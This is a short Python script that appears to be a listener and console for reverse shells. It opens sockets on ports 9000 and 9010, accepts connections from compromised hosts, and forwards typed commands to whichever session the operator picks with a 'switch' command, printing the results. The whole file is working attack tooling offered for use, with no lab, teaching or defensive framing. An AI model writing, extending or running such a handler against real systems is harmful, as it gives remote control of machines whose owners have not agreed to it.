import socket
import time
import threading
import sys
import select

thread_stdin_lock = threading.Lock()
thread_stdin_target = 0
thread_stdin_buffer = ""

def non_blocking_input(timeout=0.1):
    if select.select([sys.stdin], [], [], timeout)[0]:
        return sys.stdin.readline().strip()
    return None

def reverse_shell_connection(ip: str, port: int, id: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print(f"Listening on {port}")
    conn, addr = s.accept()
    print(f"Connection from {addr}")

    while True:
        in_focus = False
        with thread_stdin_lock:
            in_focus = thread_stdin_target == id

        if in_focus:
            cmd = ""

            with thread_stdin_lock:
                global thread_stdin_buffer
                cmd = thread_stdin_buffer
                thread_stdin_buffer = ""

            if cmd != "":
                conn.send(cmd.encode() + b"\n")
                time.sleep(0.5)
                output = conn.recv(1024).decode()

                # For some reason it prints command in first line
                output = "\n".join(output.split("\n")[1:])

                print(output, end="")

t = threading.Thread(target=reverse_shell_connection, args=('0.0.0.0', 9000, 1))
b = threading.Thread(target=reverse_shell_connection, args=('0.0.0.0', 9010, 2))
t.start()
b.start()

with thread_stdin_lock:
    print("=" * 40)
    print("=" * 40)
    print(f"Switched to thread 1")
    print("=" * 40)
    print("=" * 40)
    thread_stdin_target = 1

while True:
    c = non_blocking_input()
    if c:
        if c.startswith("switch "):
            with thread_stdin_lock:
                thread_stdin_buffer = ""
                thread_stdin_target = int(c[7:])
                print("=" * 40)
                print("=" * 40)
                print(f"Switched to thread {c[7:]}")
                print("=" * 40)
                print("=" * 40)

        else:
            with thread_stdin_lock:
                thread_stdin_buffer = c

    time.sleep(0.1)



t.join()
b.join()

